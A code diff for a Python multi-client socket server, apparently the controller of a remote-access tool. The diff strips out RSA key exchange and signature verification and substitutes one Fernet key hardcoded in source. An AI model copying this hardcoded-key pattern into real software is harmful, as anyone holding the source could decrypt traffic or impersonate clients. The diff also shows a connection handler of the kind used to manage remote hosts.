@@ -63,77 +63,6 @@ def read_file(path, block_size=1024) -> bytes:
                 return
 
 
-def Hasher(MESSAGE) -> bytes:
-    """ Hashes data """
-    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
-    digest.update(MESSAGE)
-    return digest.finalize()
-
-
-def verifySignature(publicKey, signature, message) -> bool:
-    """ Verify signature with public key """
-    try:
-        publicKey.verify(
-            signature,
-            message,
-            padding.PSS(
-                mgf=padding.MGF1(hashes.SHA256()),
-                salt_length=padding.PSS.MAX_LENGTH
-            ),
-            hashes.SHA256()
-        )
-    except:
-        return False
-    return True
-
-
-def sign(privateKey, data) -> bytes:
-    """ Sign data with private key """
-    signature = privateKey.sign(
-        data,
-        padding.PSS(
-            mgf=padding.MGF1(hashes.SHA256()),
-            salt_length=padding.PSS.MAX_LENGTH
-        ),
-        hashes.SHA256()
-    )
-    return signature
-
-
-def encrypt(publicKey, plaintext) -> bytes:
-    """ Encrypt using public key """
-    ciphertext = publicKey.encrypt(
-        plaintext,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None)
-    )
-    return ciphertext
-
-
-def decrypt(privateKey, ciphertext) -> bytes:
-    """ Decrypt using private key """
-    plaintext = privateKey.decrypt(
-        ciphertext,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return plaintext
-
-
-def public_bytes(publicKey) -> bytes:
-    """ Get Public Key in Bytes """
-    serializedPublic = publicKey.public_bytes(
-        encoding=serialization.Encoding.PEM,
-        format=serialization.PublicFormat.SubjectPublicKeyInfo
-    )
-    return serializedPublic
-
-
 def errors(ERROR, line=True) -> str:
     """ Error Handler """
     error_class = ERROR.__class__.__name__
@@ -175,16 +104,14 @@ def json_loads(data):
 
 class MultiServer(object):
 
-    def __init__(self, host='', port=9999) -> None:
+    def __init__(self, host='', port=8000, key=b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=') -> None:
         self.host = host
         self.port = port
         self.socket = None
-        self.all_keys = []
+        self.key = key
+        self.fer = Fernet(self.key)
         self.all_connections = []
         self.all_addresses = []
-
-    def __repr__(self):
-        return 'MultiServer(host="{}", port={})'.format(self.host, self.port)
 
     def socket_create(self) -> None:
         """ Create Socket """
@@ -220,19 +147,12 @@ class MultiServer(object):
             data += packet
         return data
 
-    def get_key(self, conn) -> Fernet:
-        """ Get Encryption Key from conn """
-        # returns Fernet Key
-        target = self.all_connections.index(conn)
-        return self.all_keys[target]
-
     def receive(self, conn, _print=False) -> bytes:
         """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
         # returns bytes
-        KEY = self.get_key(conn)
-        length = int(KEY.decrypt(conn.recv(2048)).decode())
+        length = int(self.fer.decrypt(conn.recv(2048)).decode())
         conn.send(b'RECEIVED')
-        received = KEY.decrypt(self.recvall(conn, length))
+        received = self.fer.decrypt(self.recvall(conn, length))
         if _print:
             print(received.decode())
         return received
@@ -240,9 +160,8 @@ class MultiServer(object):
     def send(self, conn, data) -> None:
         """ Send Buffer Size and Data to Client Encrypted with Connection Specific AES Key """
         # returns None
-        KEY = self.get_key(conn)
-        encrypted = KEY.encrypt(data)
-        conn.send(KEY.encrypt(str(len(encrypted)).encode()))
+        encrypted = self.fer.encrypt(data)
+        conn.send(self.fer.encrypt(str(len(encrypted)).encode()))
         conn.recv(1024)
         conn.send(encrypted)
 
@@ -250,55 +169,10 @@ class MultiServer(object):
         """ Accepts incoming connections and agrees on a AES key using RSA"""
         while 1:
             try:
-                privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
-                publicKey = privateKey.public_key()
                 conn, address = self.socket.accept()
                 conn.setblocking(1)
-                clientPublic = serialization.load_pem_public_key(conn.recv(20480), backend=default_backend())
-                conn.send(public_bytes(publicKey))
-
-                def recv_data(conn):
-                    buffer = int(conn.recv(4096).decode())
-                    conn.send(b'RECEIVED')
-                    data = self.recvall(conn, buffer)
-                    conn.send(b'RECEIVED')
-                    return data
-
-                Hashed_Key = recv_data(conn)
-                Encrypted = recv_data(conn)
-                Hash_Encrypted = recv_data(conn)
-                Signature = recv_data(conn)
-                Encrypted_Signature = recv_data(conn)
-
-                Encrypted_Verify = verifySignature(clientPublic, Encrypted_Signature, Hash_Encrypted)
-                logging.debug('Encrypted Hash Signature Verification: {}'.format(str(Encrypted_Verify)))
-                if not Encrypted_Verify:
-
-                    logging.error('Error Verifying Hash')
-                    continue
-
-                Decrypted = decrypt(privateKey, Encrypted)
-                Verify_Decryption = verifySignature(clientPublic, Signature, Hashed_Key)
-                logging.debug('Hash Signature Verification: {}'.format(str(Verify_Decryption)))
-                if not Verify_Decryption:
-
-                    logging.error('Error Verifying Hash')
-                    continue
-
-                Compare = Hasher(Decrypted) == Hashed_Key
-
-                logging.debug('Hash Verification: {}'.format(str(Compare)))
-                if not Compare:
-
-                    logging.error('Key and Hashed Key do not match!')
-                    continue
-
-                self.all_keys.append(Fernet(Decrypted))
                 self.all_connections.append(conn)
-                logging.debug('Fernet Key: {}'.format(str(Decrypted)))
-
                 client_hostname = self.receive(conn).decode()
-
                 address = address + (client_hostname,)
                 self.all_addresses.append(address)
                 if _print:
@@ -306,16 +180,12 @@ class MultiServer(object):
                     print('\n{0}\n{1}\n{0}'.format('-' * len(msg), msg))
             except Exception as e:
                 logging.debug(errors(e))
-            finally:
-                del privateKey
-                del publicKey
 
     def del_conn(self, conn) -> None:
         """ Delete a connection """
         target = self.all_connections.index(conn)
         del self.all_connections[target]
         del self.all_addresses[target]
-        del self.all_keys[target]
         conn.close()
 
     def refresh_connections(self) -> None:
